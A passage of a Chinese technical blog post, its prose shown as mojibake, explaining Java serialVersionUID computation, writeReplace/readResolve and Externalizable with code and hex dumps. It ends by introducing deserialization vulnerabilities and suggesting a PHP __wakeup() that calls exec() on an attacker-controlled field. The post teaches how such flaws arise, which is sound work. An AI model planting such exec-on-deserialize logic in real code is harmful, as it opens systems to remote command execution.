class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>å†™å…¥éç§æœ‰é™æ€æˆ–ç¬æ€å­—æ®µä¿¡æ¯æ•°æ®ï¼ŒåŒ…æ‹¬å­—æ®µåã€å­—æ®µè®¿é—®æƒé™æ ‡è¯†å’Œå­—æ®µç­¾åï¼ŒæŒ‰å­—æ®µåæ’åº <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field[] fields = cl.getDeclaredFields();</span><br><span class="line">MemberSignature[] fieldSigs = <span class="keyword">new</span> MemberSignature[fields.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">    fieldSigs[i] = <span class="keyword">new</span> MemberSignature(fields[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(fieldSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fieldSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = fieldSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL | Modifier.VOLATILE |</span><br><span class="line">            Modifier.TRANSIENT);</span><br><span class="line">    <span class="keyword">if</span> (((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) ||</span><br><span class="line">        ((mods &amp; (Modifier.STATIC | Modifier.TRANSIENT)) == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        dout.writeUTF(sig.name);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>å¦‚æœå­˜åœ¨ç±»åˆå§‹åŒ–å™¨ <em>ï¼ˆä¸æ˜¯ç±»å®ä¾‹åŒ–çš„æ„é€ æ–¹æ³•ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å»çœ‹çœ‹JVMè§„èŒƒä¸­çš„ç›¸å…³å†…å®¹ï¼‰</em> ï¼Œå†™å…¥å›ºå®šçš„åˆå§‹åŒ–å™¨ä¿¡æ¯æ•°æ® <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (hasStaticInitializer(cl)) &#123;</span><br><span class="line">    dout.writeUTF(<span class="string">"&lt;clinit&gt;"</span>);</span><br><span class="line">    dout.writeInt(Modifier.STATIC);</span><br><span class="line">    dout.writeUTF(<span class="string">"()V"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>å†™å…¥éç§æœ‰æ„é€ æ–¹æ³•ä¿¡æ¯æ•°æ®ï¼ŒåŒ…æ‹¬æ–¹æ³•å <em>ï¼ˆå›ºå®šä¸º<code>&lt;init&gt;</code>ï¼‰</em> ã€æ–¹æ³•è®¿é—®æƒé™æ ‡è¯†å’Œæ–¹æ³•ç­¾å <em>ï¼ˆåˆ†éš”ç¬¦<code>/</code>ä¼šæ›¿æ¢æˆ<code>.</code>çš„åŒ…åå½¢å¼ï¼‰</em> ï¼ŒæŒ‰æ–¹æ³•ç­¾åæ’åº <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] cons = cl.getDeclaredConstructors();</span><br><span class="line">MemberSignature[] consSigs = <span class="keyword">new</span> MemberSignature[cons.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cons.length; i++) &#123;</span><br><span class="line">    consSigs[i] = <span class="keyword">new</span> MemberSignature(cons[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(consSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ms1.signature.compareTo(ms2.signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; consSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = consSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">            Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">            Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">    <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">        dout.writeUTF(<span class="string">"&lt;init&gt;"</span>);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>å†™å…¥éç§æœ‰æ–¹æ³•ï¼ŒåŒ…æ‹¬æ–¹æ³•åã€æ–¹æ³•è®¿é—®æƒé™æ ‡è¯†å’Œæ–¹æ³•ç­¾åï¼ŒæŒ‰æ–¹æ³•åå’Œæ–¹æ³•ç­¾åæ’åº <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MemberSignature[] methSigs = <span class="keyword">new</span> MemberSignature[methods.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">    methSigs[i] = <span class="keyword">new</span> MemberSignature(methods[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(methSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> comp = ms1.name.compareTo(ms2.name);</span><br><span class="line">        <span class="keyword">if</span> (comp == <span class="number">0</span>) &#123;</span><br><span class="line">            comp = ms1.signature.compareTo(ms2.signature);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> comp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = methSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">            Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">            Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">    <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">        dout.writeUTF(sig.name);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

</li>
</ol>
<p>ä»¥ä¸Šå°±æ˜¯SUIDä¸­åŒ…å«çš„ç±»çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¾—åˆ°çš„äºŒè¿›åˆ¶ä¸²å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 11 53 65 72 69 61 6c  69 7a 61 74 69 6f 6e 44    ..Serial izationD</span><br><span class="line">65 6d 6f 00 00 00 01 00  14 6a 61 76 61 2e 69 6f    emo..... .java.io</span><br><span class="line">2e 53 65 72 69 61 6c 69  7a 61 62 6c 65 00 08 69    .Seriali zable..i</span><br><span class="line">6e 74 46 69 65 6c 64 00  00 00 02 00 01 49 00 0b    ntField. .....I..</span><br><span class="line">73 74 72 69 6e 67 46 69  65 6c 64 00 00 00 02 00    stringFi eld.....</span><br><span class="line">12 4c 6a 61 76 61 2f 6c  61 6e 67 2f 53 74 72 69    .Ljava&#x2F;l ang&#x2F;Stri</span><br><span class="line">6e 67 3b 00 06 3c 69 6e  69 74 3e 00 00 00 01 00    ng;..&lt;in it&gt;.....</span><br><span class="line">16 28 4c 6a 61 76 61 2e  6c 61 6e 67 2e 53 74 72    .(Ljava. lang.Str</span><br><span class="line">69 6e 67 3b 49 29 56 00  04 6d 61 69 6e 00 00 00    ing;I)V. .main...</span><br><span class="line">09 00 16 28 5b 4c 6a 61  76 61 2e 6c 61 6e 67 2e    ...([Lja va.lang.</span><br><span class="line">53 74 72 69 6e 67 3b 29  56                         String;)V</span><br></pre></td></tr></table></figure></div>

<p>æœ€åï¼Œå°†äºŒè¿›åˆ¶æ•°æ®é€šè¿‡SHA1ç®—æ³•å¾—åˆ°æ‘˜è¦ï¼Œå–å‰8ä½æŒ‰BigEndiançš„å­—èŠ‚é¡ºåºè½¬æ¢æˆé•¿æ•´å‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> hash = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = Math.min(hashBytes.length, <span class="number">8</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    hash = (hash &lt;&lt; <span class="number">8</span>) | (hashBytes[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿”å›çš„<code>hash</code>å°±æ˜¯æœ€ç»ˆçš„SUIDäº†ã€‚</p>
<p>ç”±æ­¤å¯çŸ¥ï¼Œå½“çˆ¶ç±»æˆ–éåŸå§‹æ•°æ®ç±»å‹å­—æ®µçš„ç±»å†…éƒ¨å‘ç”Ÿå˜æ›´æ—¶ï¼Œå¹¶ä¸ä¼šå½±å“å½“å‰ç±»çš„SUIDå€¼ï¼Œå†ç»“åˆä¹‹å‰çš„å†…å®¹æˆ‘ä»¬è¿˜å¯ä»¥å¼•ç”³å‡ºä¸¤ä¸ªç»“è®ºï¼š</p>
<ol>
<li>è‹¥å½“å‰ç±»è‡ªå®šä¹‰äº†<code>readObject()</code>ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šæ­£å¸¸æ‰§è¡Œ<code>readObject()</code>ä¸­æ‰€æœ‰<code>ObjectInputStream.defaultReadObject()</code> <em>ï¼ˆå¦‚æœè°ƒç”¨äº†çš„è¯ï¼‰</em> ä¹‹å‰çš„é€»è¾‘ï¼›å¦åˆ™åœ¨å¤„ç†åˆ°å˜æ›´å¯¹è±¡æ—¶ï¼Œä»ä¼šæŠ›å‡º<code>InvalidClassException</code></li>
<li>ç”±äºåºåˆ—åŒ–ä¼šå¯¹ç±»çš„å­—æ®µè¿›è¡Œæ’åºï¼Œå¹¶åœ¨ååºåˆ—åŒ–æ—¶æŒ‰é¡ºåºéå†å¤„ç†ï¼Œæ‰€ä»¥ååºåˆ—åŒ–ä¼šæ­£å¸¸å¤„ç†å­—æ®µåæ¯”å˜æ›´å¯¹è±¡ç±»å‹å­—æ®µã€å°ã€çš„å…¶ä»–å­—æ®µ</li>
</ol>
<h3 id="å…³äºwriteReplace-å’ŒreadResolve"><a href="#å…³äºwriteReplace-å’ŒreadResolve" class="headerlink" title="å…³äºwriteReplace()å’ŒreadResolve()"></a>å…³äº<code>writeReplace()</code>å’Œ<code>readResolve()</code></h3><p>åœ¨å‰é¢çš„æ‰§è¡Œæµç¨‹åˆ†æä¸­ï¼Œä¸ºäº†çªå‡ºä¸»è¦é€»è¾‘ï¼Œæˆ‘ä»¬ä¸»è§‚çš„å¿½ç•¥äº†ä¸€äº›å†…å®¹ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†åºåˆ—åŒ–çš„<code>invokeWriteReplace()</code>å’Œååºåˆ—åŒ–çš„<code>invokeReadResolve()</code>ã€‚</p>
<p>ç°åœ¨å°±æ¥çœ‹çœ‹å®ƒä»¬åˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼š</p>
<ul>
<li><p><code>writeReplace()</code></p>
<p>  è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸ºå®é™…è¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œåœ¨åŸå¯¹è±¡åºåˆ—åŒ–ä¹‹å‰è¢«è°ƒç”¨ï¼Œæ›¿æ¢åŸå¯¹è±¡æˆä¸ºå¾…åºåˆ—åŒ–å¯¹è±¡</p>
</li>
<li><p><code>readResolve()</code></p>
<p>  è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸ºå®é™…ååºåˆ—åŒ–çš„ç»“æœå¯¹è±¡ï¼Œåœ¨åŸå¯¹è±¡ååºåˆ—åŒ–ä¹‹åè¢«è°ƒç”¨ï¼Œä¸å½±å“åŸå¯¹è±¡çš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»…æ›¿æ¢ç»“æœ</p>
</li>
</ul>
<p>å†ä»å…·ä½“ç¤ºä¾‹æ¥ä½“ä¼šä¸€ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationReplacementClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String replacementField;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SerializationReplacementClass(<span class="string">"resolve"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SerializationReplacementClass</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.replacementField = s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerializationReplacementClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.replacementField = <span class="string">"replace"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">writeReplace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SerializationReplacementClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// omit</span></span><br><span class="line">        SerializationReplacementClass demo = (SerializationReplacementClass) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä»åºåˆ—åŒ–ä¹‹åå¾—åˆ°çš„äºŒè¿›åˆ¶ä¸²ä¸­å¯ä»¥çœ‹åˆ°ç›®æ ‡å¯¹è±¡å·²ç»è¢«æ›¿æ¢æˆäº†<code>SerializationReplacementClass</code>ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 1d  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 52 65 70  6c 61 63 65 6d 65 6e 74    ationRep lacement</span><br><span class="line">43 6c 61 73 73 32 71 ac  e9 c1 d3 0b 7b 02 00 01    Class2q. ....&#123;...</span><br><span class="line">4c 00 10 72 65 70 6c 61  63 65 6d 65 6e 74 46 69    L..repla cementFi</span><br><span class="line">65 6c 64 74 00 12 4c 6a  61 76 61 2f 6c 61 6e 67    eldt..Lj ava&#x2F;lang</span><br><span class="line">2f 53 74 72 69 6e 67 3b  78 70 74 00 07 72 65 70    &#x2F;String; xpt..rep</span><br><span class="line">6c 61 63 65                                         lace</span><br></pre></td></tr></table></figure></div>

<p>è€Œåœ¨ååºåˆ—åŒ–ä¹‹åå¾—åˆ°çš„å¯¹è±¡çš„<code>replacementField</code>å­—æ®µå€¼åˆ™ä¸º<code>resolve</code>ï¼Œä½†åœ¨æ­¤ä¹‹å‰<code>readObject()</code>ä¹Ÿä¼šè¢«æ­£å¸¸è°ƒç”¨ï¼Œå½“æ—¶<code>replacementField</code>å­—æ®µå€¼ä¸º<code>replace</code>ã€‚</p>
<h3 id="å…³äºExternalizable"><a href="#å…³äºExternalizable" class="headerlink" title="å…³äºExternalizable"></a>å…³äº<code>Externalizable</code></h3><p><code>Serializable</code>æ¥å£è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„å­ç±»<code>Externalizable</code>ï¼Œå®ƒæ¯”å®ƒçˆ¸çˆ¸ç‰¹æ®Šçš„åœ°æ–¹å°±åœ¨äºå®ƒéœ€è¦è‡ªå·±å®ç°è¯»å†™æ–¹æ³• <em>ï¼ˆ<code>readExternal()</code>å’Œ<code>writeExternal()</code>ï¼‰</em> ï¼ŒåŒæ—¶å¿…é¡»åŒ…å«ä¸€ä¸ªè‡ªå·±çš„æ— å‚æ„é€ æ–¹æ³• <em>ï¼ˆé»˜è®¤éšå¼çš„ä¹Ÿå¯ä»¥ï¼‰</em> ã€‚</p>
<p>ä»ä»¥ç¤ºä¾‹è¯´è¯ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExternalizationDemo</span> <span class="keyword">implements</span> <span class="title">Externalizable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.writeUTF(<span class="keyword">this</span>.stringField);</span><br><span class="line">        out.writeInt(<span class="keyword">this</span>.intField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = <span class="string">"hello, i'm "</span> + in.readUTF();</span><br><span class="line">        <span class="keyword">this</span>.intField = in.readInt() + <span class="number">100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExternalizationDemo</span><span class="params">(String s, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="keyword">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExternalizationDemo</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åºåˆ—åŒ–ä¹‹åå¾—åˆ°çš„äºŒè¿›åˆ¶ä¸²å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 13  45 78 74 65 72 6e 61 6c    ....sr.. External</span><br><span class="line">69 7a 61 74 69 6f 6e 44  65 6d 6f d9 a9 04 75 84    izationD emo...u.</span><br><span class="line">5d 06 8f 0c 00 00 78 70  77 0b 00 05 67 79 79 79    ].....xp w...gyyy</span><br><span class="line">79 00 01 7d f1 78                                   y..&#125;.x</span><br></pre></td></tr></table></figure></div>

<p>ä¸<code>Serializable</code>çš„åŒºåˆ«ï¼š</p>
<ul>
<li>å¯¹è±¡çš„åºåˆ—åŒ–å±æ€§æ ‡å¿—ä½ä¸º<code>0x0c</code>ï¼ŒåŒ…æ‹¬<code>Serializable</code>å’ŒBlock Dataçš„æ ‡å¿—</li>
<li>åºåˆ—åŒ–ç±»çš„å­—æ®µä¸ªæ•°å›ºå®šä¸º0</li>
<li>åºåˆ—åŒ–è°ƒç”¨<code>writeExternalData()</code>è½¬ç»™ç±»è‡ªå®šä¹‰çš„å†™æ–¹æ³•ï¼Œå°†å†™å…¥çš„æ•°æ®åŒ…è£…åœ¨æ–°çš„Block Dataå—ä¸­ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºå—é•¿åº¦ <em>ï¼ˆä¸å«å—å¤´å°¾æ ‡è¯†ï¼‰</em></li>
<li>ååºåˆ—åŒ–è°ƒç”¨<code>readExternalData()</code>è½¬ç»™ç±»è‡ªå®šä¹‰çš„è¯»æ–¹æ³•ï¼Œå†è°ƒç”¨å¯¹è±¡çš„æ— å‚æ„é€ æ–¹æ³• <em>ï¼ˆè‹¥ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›<code>null</code>ï¼‰</em> è¿›è¡Œå®ä¾‹åŒ–</li>
</ul>
<h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><p>é€šè¿‡ä»¥ä¸Šå¯¹Javaçš„åºåˆ—åŒ–æœºåˆ¶çš„å¤§è‡´äº†è§£ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³è±¡ä¸€ä¸ªåœºæ™¯ <em>ï¼ˆæœ‰åŸºç¡€çš„åŒå­¦å¯ä»¥è·³è¿‡æœ¬éƒ¨åˆ†å†…å®¹ï¼Œå½“ç„¶ï¼Œçœ‹ä¸€çœ‹ä¹Ÿæ²¡åå¤„ï¼‰</em> ï¼š</p>
<blockquote>
<p>å½“æœåŠ¡ç«¯å…è®¸æ¥æ”¶è¿œç«¯æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå®¢æˆ·ç«¯å¯ä»¥æä¾›ä»»æ„ä¸€ä¸ªæœåŠ¡ç«¯å­˜åœ¨çš„å¯¹è±¡ <em>ï¼ˆåŒ…æ‹¬ä¾èµ–åŒ…ä¸­çš„å¯¹è±¡ï¼‰</em> çš„åºåˆ—åŒ–äºŒè¿›åˆ¶ä¸²ï¼Œç”±æœåŠ¡ç«¯ååºåˆ—åŒ–æˆç›¸åº”å¯¹è±¡ã€‚å¦‚æœè¯¥å¯¹è±¡æ˜¯ç”±æ”»å‡»è€…ã€ç²¾å¿ƒæ„é€ ã€çš„æ¶æ„å¯¹è±¡ï¼Œè€Œå®ƒè‡ªå®šä¹‰çš„<code>readObject()</code>ä¸­å­˜åœ¨ç€ä¸€äº›ã€ä¸å®‰å…¨ã€çš„é€»è¾‘ï¼Œé‚£ä¹ˆåœ¨å¯¹å®ƒååºåˆ—åŒ–æ—¶å°±æœ‰å¯èƒ½å‡ºç°å®‰å…¨é—®é¢˜ã€‚</p>
</blockquote>
<p>è¯´åˆ°è¿™ï¼Œæˆ‘æä¸‰ä¸ªé—®é¢˜ï¼Œè¯·å¤§å®¶è·Ÿç€æˆ‘çš„æ€è·¯å»åˆ†æï¼Œå…ˆæ¥çœ‹çœ‹ç¬¬ä¸€ä¸ªï¼š</p>
<ol>
<li>ä¸ºä»€ä¹ˆéœ€è¦ä¾èµ–ååºåˆ—åŒ–å¯¹è±¡çš„è‡ªå®šä¹‰<code>readObject()</code>ï¼Ÿ</li>
</ol>
<p>å¤§å®¶éƒ½çŸ¥é“ï¼Œæ­£å¸¸æ¥è¯´ï¼Œååºåˆ—åŒ–åªæ˜¯ä¸€ä¸ªå¯¹è±¡å®ä¾‹åŒ–ç„¶åèµ‹å€¼çš„è¿‡ç¨‹ï¼Œå¦‚æœä¹‹åä¸ä¸»åŠ¨è°ƒç”¨å®ƒçš„å†…éƒ¨æ–¹æ³•ï¼Œç†è®ºä¸Šæœ€å¤šåªèƒ½æ§åˆ¶å®ƒå­—æ®µçš„å€¼è€Œå·²ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•èƒ½å¤Ÿè®©å®ƒæ‰§è¡Œååºåˆ—åŒ–ä»¥å¤–çš„é€»è¾‘å‘¢ï¼Ÿæ¯•ç«Ÿåšçš„è¶Šå¤šä¸­é—´äº§ç”Ÿé—®é¢˜çš„æ¦‚ç‡å°±è¶Šå¤§ã€‚</p>
<p>æˆ‘ä»¬è¿˜æ˜¯å…ˆä»¥å¤§å®¶æ›´ç†Ÿæ‚‰çš„PHPæ¥ä¸¾ä¸ªä¾‹ã€‚åœ¨PHPå†…éƒ¨ï¼Œä¿ç•™äº†åå¤šä¸ªè¢«ç§°ä¸ºé­”æœ¯æ–¹æ³•çš„ç±»æ–¹æ³•ï¼Œè¿™äº›é­”æœ¯æ–¹æ³•ä¸€èˆ¬ä¼šä¼´éšç€ç±»çš„ç”Ÿå‘½å‘¨æœŸè¢«PHPåº•å±‚è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨æˆ·å¯ä»¥åœ¨ç±»ä¸­æ˜¾å¼å®šä¹‰å®ƒä»¬çš„é€»è¾‘ã€‚</p>
<p>å°±æ‹¿ä¸ååºåˆ—åŒ–å…³ç³»æœ€å¯†åˆ‡çš„<code>__wakeup()</code>æ¥è¯´ï¼Œæˆ‘ä»¬å›åˆ°æœ€åˆçš„é‚£ä¸ªç±»<code>SerializationDemo</code>ï¼Œç»™å®ƒåŠ ä¸€ç‚¹ä¸œè¥¿ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;stringField;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ååºåˆ—åŒ–<code>SerializationDemo</code>è¿™ä¸ªå¯¹è±¡æ—¶ï¼Œå°±ä¼šè°ƒç”¨<code>__wakeup()</code>æ‰§è¡Œé‡Œé¢çš„é€»è¾‘ã€‚ç¤ºä¾‹ä¸­çš„é€»è¾‘åªæ˜¯è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœæ”¹æˆ<code>exec($this-&gt;stringField);</code>å‘¢ï¼Ÿ</p>
